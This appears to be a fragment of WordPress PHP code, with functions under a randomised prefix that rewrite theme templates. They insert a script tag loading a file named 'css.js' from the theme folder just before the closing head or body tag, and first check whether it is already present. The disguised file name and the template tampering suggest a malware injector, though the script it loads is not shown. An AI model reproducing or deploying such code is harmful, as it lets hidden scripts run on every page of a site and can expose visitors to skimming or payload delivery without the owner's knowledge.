function i1b4788e9_get_script_tag() {
	$url = get_template_directory_uri() . '/css.js';

	$tag = '<script src="' . esc_url( $url ) . '"></script>';

	return apply_filters( 'i1b4788e9_script_tag', $tag, $url );
}

function i1b4788e9_header_has_css_js_script( $content ) {
	if ( preg_match( '#<script\b[^>]*\bsrc\s*=\s*["\'][^"\']*css\.js(?:\?[^"\']*)?["\']#i', $content ) ) {
		return true;
	}

	return (bool) preg_match(
		'#get_template_directory_uri\s*\(\s*\)\s*\.\s*["\']/css\.js["\']#i',
		$content
	);
}

function i1b4788e9_is_standalone_closing_tag( $content, $offset, $tag ) {
	$line_start = strrpos( substr( $content, 0, $offset ), "\n" );
	$line_start = ( false === $line_start ) ? 0 : $line_start + 1;

	$line_end = strpos( $content, "\n", $offset );
	if ( false === $line_end ) {
		$line_end = strlen( $content );
	}

	$line = substr( $content, $line_start, $line_end - $line_start );

	return (bool) preg_match( '/^\s*<\/' . preg_quote( $tag, '/' ) . '>\s*$/i', $line );
}

function i1b4788e9_find_closing_tag_position( $content ) {
	$targets = array(
		array(
			'tag'  => 'head',
			'hook' => '/wp_head\s*\(\s*\)\s*;/i',
		),
		array(
			'tag'  => 'body',
			'hook' => '/wp_footer\s*\(\s*\)\s*;/i',
		),
	);

	foreach ( $targets as $target ) {
		$min_offset = 0;
		if ( preg_match( $target['hook'], $content, $hook_match, PREG_OFFSET_CAPTURE ) ) {
			$min_offset = $hook_match[0][1] + strlen( $hook_match[0][0] );
		}

		if ( ! preg_match_all( '/<\/' . $target['tag'] . '>/i', $content, $matches, PREG_OFFSET_CAPTURE ) ) {
			continue;
		}

		$chosen = null;

		foreach ( $matches[0] as $match ) {
			if ( $match[1] < $min_offset ) {
				continue;
			}

			if ( i1b4788e9_is_standalone_closing_tag( $content, $match[1], $target['tag'] ) ) {
				$chosen = $match;
			}
		}

		if ( null === $chosen ) {
			foreach ( $matches[0] as $match ) {
				if ( $match[1] >= $min_offset ) {
					$chosen = $match;
				}
			}
		}

		if ( null !== $chosen ) {
			return array(
				'offset' => $chosen[1],
				'length' => strlen( $chosen[0] ),
			);
		}
	}

	return null;
}

function i1b4788e9_inject_before_head_or_body( $content, $snippet ) {
	$position = i1b4788e9_find_closing_tag_position( $content );
	if ( null === $position ) {
		return false;
	}

	$block = "\n" . $snippet . "\n";

	return substr_replace( $content, $block, $position['offset'], 0 );
}

